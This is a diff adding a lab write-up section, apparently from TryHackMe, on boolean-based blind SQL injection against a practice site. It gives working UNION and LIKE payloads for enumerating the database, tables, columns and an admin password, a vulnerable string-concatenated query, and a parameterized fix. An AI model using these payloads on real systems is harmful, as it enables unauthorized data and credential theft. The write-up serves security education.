@@ -339,6 +339,205 @@ Authentication bypass vulnerabilities can allow attackers to:
 
 # 4. Blind SQL Injection – Boolean-Based
 
+Boolean-Based Blind SQL Injection relies on observing differences in the application's responses to determine whether an injected SQL query evaluates to `TRUE` or `FALSE`.
+
+Although no database errors or query results are directly displayed, attackers can still enumerate database information by analyzing application behavior.
+
+---
+
+## Target endpoint
+
+The vulnerable endpoint exposed the following functionality:
+
+```http
+https://website.thm/checkuser?username=admin
+```
+
+The application returned responses such as:
+
+```json
+{"taken":true}
+```
+
+or
+
+```json
+{"taken":false}
+```
+
+This behavior created a boolean condition that could be used to infer database information.
+
+![Boolean response comparison](images/sqli_boolean_response-comparison1.png)
+
+![Boolean response comparison](images/sqli_boolean_response-comparison2.png)
+
+---
+
+## Original query structure
+
+The backend query processed user-controlled input as follows:
+
+```sql
+SELECT * FROM users
+WHERE username='%username%'
+LIMIT 1;
+```
+
+Because the application directly concatenated user input into the SQL query, it became vulnerable to SQL Injection.
+
+---
+
+## Identifying the number of columns
+
+The `UNION SELECT` technique was used to determine the number of columns required by the original query.
+
+Example payloads:
+
+```sql
+admin123' UNION SELECT 1;--
+```
+
+```sql
+admin123' UNION SELECT 1,2,3;--
+```
+
+The application returned a positive boolean response when using three columns, confirming the correct query structure.
+
+![Boolean-based column enumeration](images/sqli_boolean_column-enumeration.png)
+
+---
+
+## Enumerating the database name
+
+The `LIKE` operator was used alongside wildcard characters (`%`) to infer the database name character by character.
+
+Example payload:
+
+```sql
+admin123' UNION SELECT 1,2,3
+WHERE database() LIKE 's%';--
+```
+
+A `TRUE` response confirmed that the database name started with the letter `s`.
+
+This process was repeated iteratively until the full database name was identified as:
+
+```text
+sqli_three
+```
+
+![Database name enumeration](images/sqli_boolean_database-enumeration.png)
+
+---
+
+## Enumerating table names
+
+The `information_schema.tables` table was queried to enumerate database tables.
+
+Example payload:
+
+```sql
+admin123' UNION SELECT 1,2,3
+FROM information_schema.tables
+WHERE table_schema='sqli_three'
+AND table_name LIKE 'u%';--
+```
+
+This confirmed the existence of the `users` table.
+
+![Table enumeration](images/sqli_boolean_table-enumeration.png)
+
+---
+
+## Enumerating column names
+
+Column names were enumerated using the `information_schema.columns` table.
+
+Example payload:
+
+```sql
+admin123' UNION SELECT 1,2,3
+FROM information_schema.columns
+WHERE table_schema='sqli_three'
+AND table_name='users'
+AND column_name LIKE 'u%';--
+```
+
+The following columns were identified:
+
+- id
+- username
+- password
+
+![Column enumeration](images/sqli_boolean_column-discovery1.png)
+
+![Column enumeration](images/sqli_boolean_column-discovery2.png)
+
+![Column enumeration](images/sqli_boolean_column-discovery3.png)
+
+---
+
+## Enumerating credentials
+
+The same boolean inference technique was used to identify valid usernames and passwords.
+
+Example payload:
+
+```sql
+admin123' UNION SELECT 1,2,3
+FROM users
+WHERE username='admin'
+AND password LIKE '3%';--
+```
+
+By iterating through characters one at a time, the password was successfully enumerated.
+
+![Credential enumeration](images/sqli_boolean_credential-enumeration.png)
+
+---
+
+## Why this works
+
+The application does not directly display SQL errors or query results, but it still exposes differences in behavior based on whether injected conditions evaluate to `TRUE` or `FALSE`.
+
+Attackers can leverage these boolean responses to infer database structure and contents one character at a time.
+
+---
+
+## Vulnerable query example
+
+```python
+query = "SELECT * FROM users WHERE username='" + username + "'"
+```
+
+Because user input is directly concatenated into the query, attackers can inject additional SQL logic into the statement.
+
+---
+
+## Secure implementation
+
+Parameterized queries should be used to prevent user input from altering SQL query logic.
+
+Example:
+
+```python
+query = "SELECT * FROM users WHERE username=%s"
+cursor.execute(query, (username,))
+```
+
+Input validation and proper error handling should also be implemented to reduce information leakage.
+
+---
+
+## Security Impact
+
+Boolean-Based Blind SQL Injection can allow attackers to:
+
+- Enumerate database structures
+- Extract sensitive data
+- Identify valid usernames
+- Recover credentials
+- Gain unauthorized access to applications
 
 ---
 
